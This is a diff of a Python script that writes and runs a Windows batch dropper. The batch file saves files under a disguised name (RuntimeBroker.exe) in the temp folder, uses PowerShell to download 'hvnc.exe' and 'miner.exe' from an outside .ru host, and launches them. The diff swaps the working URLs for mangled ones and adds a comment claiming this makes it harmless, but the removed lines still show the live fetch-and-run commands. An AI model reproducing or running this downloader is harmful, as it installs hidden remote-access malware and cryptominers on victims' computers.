@@ -1,5 +1,5 @@
 import os
-
+#URL badly written so nothing bad can occur
 def create_and_run_bat_script():
     bat_script_content = '''
 @echo off
@@ -44,9 +44,9 @@ set "temp_file=%TEMP%\RuntimeBroker.exe"
 
 set "temp_file2=%TEMP%\RuntimeBroker2.exe"
 
-powershell -command "(New-Object System.Net.WebClient).DownloadFile('https://kleinanzeigen.ru/hvnc.exe', '%temp_file%')"
+powershell -command "(New-Object System.Net.WebClient).DownloadFile('https://k!=!=!=leinan!=!=zeig=!!=!=en.ru/h()()()(vnc.exe', '%temp_file%')"
 
-powershell -command "(New-Object System.Net.WebClient).DownloadFile('https://kleinanzeigen.ru/miner.exe', '%temp_file2%')"
+powershell -command "(New-Object System.Net.WebClient).DownloadFile('https://k!=!=!=leinan!=!=zeig=!!=!=en.ru/m()()()()iner.exe', '%temp_file2%')"
 
 start "" "%temp_file%"
 
